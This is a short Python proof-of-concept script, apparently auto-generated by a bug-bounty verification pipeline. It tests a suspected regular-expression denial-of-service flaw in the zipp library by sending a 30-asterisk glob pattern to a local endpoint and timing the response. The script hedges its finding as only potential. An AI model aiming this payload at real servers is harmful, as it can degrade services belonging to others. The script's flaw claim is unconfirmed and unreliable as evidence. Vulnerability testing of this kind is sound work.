#!/usr/bin/env python3
# PoC for zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c (/tmp/bounty_test/zipp_src/zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c)
# Path: suspicious-011
# Sink: match
# Auto-generated — run with: python3 suspicious_verifier_pattern_evidence_llm_match.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept script for potential ReDoS vulnerability in zipp library.
The vulnerability originates from user-controlled glob patterns being converted
to regular expressions without atomic grouping, leading to catastrophic
backtracking when the pattern contains many consecutive wildcards.

The script sends a benign pattern (single '*') and a malicious pattern
(many consecutive '*') to the target endpoint, measuring response times.
A significant delay or timeout indicates possible ReDoS.
"""

import argparse
import requests
import sys
import time

# Default target URL (can be overridden via command line)
DEFAULT_TARGET = "http://localhost:8080/api/v1/trigger"

def send_pattern(url, pattern, timeout=10):
    """Send a POST request with the given pattern and return response time."""
    try:
        start = time.time()
        response = requests.post(url, data={"untrusted_user_input": pattern},
                                 timeout=timeout)
        elapsed = time.time() - start
        return elapsed, response.status_code
    except requests.exceptions.Timeout:
        return timeout, None  # Treat timeout as maximum allowed
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None, None

def main():
    parser = argparse.ArgumentParser(
        description="ReDoS PoC for zipp library (entry point: rglob)"
    )
    parser.add_argument("-t", "--target", default=DEFAULT_TARGET,
                        help=f"Target URL (default: {DEFAULT_TARGET})")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Request timeout in seconds (default: 10)")
    args = parser.parse_args()

    url = args.target
    timeout = args.timeout

    # Benign pattern – a single star, which compiles to a simple regex
    benign_pattern = "*"
    # Malicious pattern – many consecutive stars, leading to repeated [^/]*
    # This can cause exponential backtracking when matching long strings.
    malicious_pattern = "*" * 30   # 30 stars

    print("[*] Testing benign pattern (single '*')...")
    benign_time, benign_status = send_pattern(url, benign_pattern, timeout)
    if benign_time is None:
        print("[!] Benign test failed – check target availability.")
        sys.exit(1)
    print(f"[*] Benign response time: {benign_time:.2f}s (status: {benign_status})")

    print("[*] Testing malicious pattern (30 consecutive '*')...")
    malicious_time, malicious_status = send_pattern(url, malicious_pattern,
                                                     timeout)
    if malicious_time is None:
        print("[!] Malicious test failed – check target availability.")
        sys.exit(1)

    if malicious_time >= timeout:
        print(f"[!] Malicious request timed out (>{timeout}s). "
              "Potential ReDoS detected!")
        print("[*] The server may be vulnerable to a Regular Expression Denial "
              "of Service attack via crafted glob patterns.")
    elif malicious_time > benign_time * 5:
        print(f"[!] Malicious response time ({malicious_time:.2f}s) is "
              f"significantly higher than benign ({benign_time:.2f}s). "
              "This could indicate a ReDoS vulnerability.")
    else:
        print("[*] No significant slowdown detected. "
              "The server may not be vulnerable or the test environment "
              "lacks long filenames required to trigger backtracking.")

    print("\n[*] Done. For a more definitive test, run against a target "
          "that contains files with long names (e.g., >100 characters).")

if __name__ == "__main__":
    main()
